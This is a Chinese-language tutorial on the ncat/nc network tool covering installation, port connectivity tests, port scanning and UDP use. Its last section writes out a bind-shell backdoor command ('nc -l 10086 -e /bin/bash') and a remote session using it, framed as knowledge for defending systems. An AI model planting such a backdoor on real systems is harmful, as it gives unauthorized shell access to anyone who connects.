## 介绍

`ncat` 或者说 `nc` 是一款功能类似 `cat` 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读、写以及重定向数据。 它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。 

 `ncat`/`nc` 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 

## 安装

```shell
# yum install -y nmap-ncat
```

注意：CentOS 7 和 CentOS 6 系统安装的程序版本不同，有些功能也有区别，CentOS 7 使用不方便的就是批量端口扫描没有 CentOS 6 容易。

## 常用方式

### 测试某个端口是否联通

### CentOS 7

```shell
# nc -vzn 192.168.24.112 80
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.24.112:80.
Ncat: 0 bytes sent, 0 bytes received in 0.02 seconds.
```

* -z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换
* -v 参数指使用冗余选项
* -n 参数告诉netcat 不要使用DNS反向查询IP地址的域名 

```shell
# nc -nzv 192.168.23.55 81 -w 2
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connection timed out.
```

*  -w<超时秒数> 设置等待连线的时间。

#### CentOS 6

```shell
# nc -nzv 192.168.23.55 80 -w 2
Connection to 192.168.23.55 80 port [tcp/*] succeeded!
```

### 端口扫描

#### CentOS 7

这里建议使用 nmp 进行多个端口扫描：

```shell
# nmap -n  192.168.23.55 -p 80-85

Starting Nmap 6.40 ( http://nmap.org ) at 2020-04-28 11:07 CST
Nmap scan report for 192.168.23.55
Host is up (0.0017s latency).
PORT   STATE    SERVICE
80/tcp open     http
81/tcp filtered hosts2-ns
82/tcp filtered xfer
83/tcp filtered mit-ml-dev
84/tcp filtered ctf
85/tcp filtered mit-ml-dev

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```

#### CentOS 6

```shell
# nc -nzv 192.168.23.55 80-85
Connection to 192.168.23.55 80 port [tcp/*] succeeded!
nc: connect to 192.168.23.55 port 81 (tcp) failed: Connection refused
nc: connect to 192.168.23.55 port 82 (tcp) failed: Connection refused
nc: connect to 192.168.23.55 port 83 (tcp) failed: Connection refused
nc: connect to 192.168.23.55 port 84 (tcp) failed: Connection refused
nc: connect to 192.168.23.55 port 85 (tcp) failed: Connection refused
```

### 连接 UDP 端口

 默认情况下，`nc` 创建连接时只会连接 TCP 端口。 不过我们可以使用 `-u` 选项来连接到 UDP 端口。

### 通过 nc 创建后门

 `nc` 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为： 

```shell
# nc -l 10086 -e /bin/bash
```

 `-e` 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限： 

```shell
# nc  192.168.23.55 10086
ls
anaconda-ks.cfg
stream.tar.gz
rm -f stream.tar.gz
ls
anaconda-ks.cfg
```